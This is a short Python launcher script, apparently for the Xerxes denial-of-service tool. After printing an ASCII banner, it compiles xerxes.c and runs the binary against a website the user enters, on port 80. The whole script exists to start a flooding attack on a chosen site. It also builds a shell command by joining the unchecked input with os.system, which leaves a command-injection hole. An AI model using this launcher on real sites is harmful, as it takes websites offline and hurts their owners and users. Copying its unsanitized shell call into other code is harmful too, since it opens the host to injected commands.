import os
os.system("clear")
print("""
 _       _     _ _                             _
| |_ ___| |__ (_) | ____ _ _ __ ___   ___   __| |____
| __/ __| '_ \| | |/ / _` | '_ ` _ \ / _ \ / _` |_  /
| || (__| | | | |   < (_| | | | | | | (_) | (_| |/ /
 \__\___|_| |_|_|_|\_\__,_|_| |_| |_|\___/ \__,_/___|
""")  
os.system("chmod +x xerxes.c")
os.system("gcc xerxes.c -o xerxes")
a = input("\n Entre un site : www.fakesite.com \n Website Name : ")
os.system("./xerxes "+a+" 80")
